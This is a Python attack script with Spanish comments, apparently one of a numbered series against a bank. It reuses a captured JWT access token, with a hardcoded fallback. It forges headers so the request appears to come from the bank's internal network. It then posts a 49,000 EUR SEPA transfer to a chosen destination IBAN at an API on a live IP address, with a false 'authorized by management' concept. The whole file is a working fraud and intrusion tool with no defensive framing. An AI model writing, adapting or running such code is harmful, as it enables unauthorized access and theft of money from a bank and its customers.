import requests

# Token JWT de acceso desde script 07
try:
    with open("interno_token.txt", "r") as tokfile:
        access_token = tokfile.read().strip()
except FileNotFoundError:
    access_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1hcmttdXI4OCIsImlhdCI6MTc1MTc3NjU3OCwiZXhwIjoxNzUxNzgwMTc4fQ.kCr0_8xTpI73gTOs_3XUIFUXSOfA5PfzqRI20yVC5Yg"

# === URLs ===
transfer_url = "http://80.78.30.242:9181/api/send-transfer"
verify_url = "http://80.78.30.242:9181/api/transferencia/verify/"

# === Fingimos conexión interna ===
session = requests.Session()
session.headers.update({
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "application/json,text/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
    "Authorization": f"Bearer {access_token}",
    "Content-Type": "application/json",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-CENTRAL-ES",
    "X-Session-Type": "BANCO-INTERNAL"
})

# === Datos de transferencia ===
payload = {
    "iban_origen": "TU_iban_de_origen_valido",
    "iban_destino": "iban_de_la_cuenta_que_quieras",
    "monto": 49000.00,
    "currency": "EUR",
    "concepto": "Transferencia interna autorizada por gerencia",
    "reason_code": "TECH-APPR"  # Si el sistema lo acepta
}

# === Hacer la transferencia desde token interno ===
print("\n[+] Inyectando transferencia SEPA desde sesión JWT interna...")
transfer_response = session.post(transfer_url, json=payload)
print("Estado HTTP:", transfer_response.status_code)
print("Respuesta del sistema:", transfer_response.text)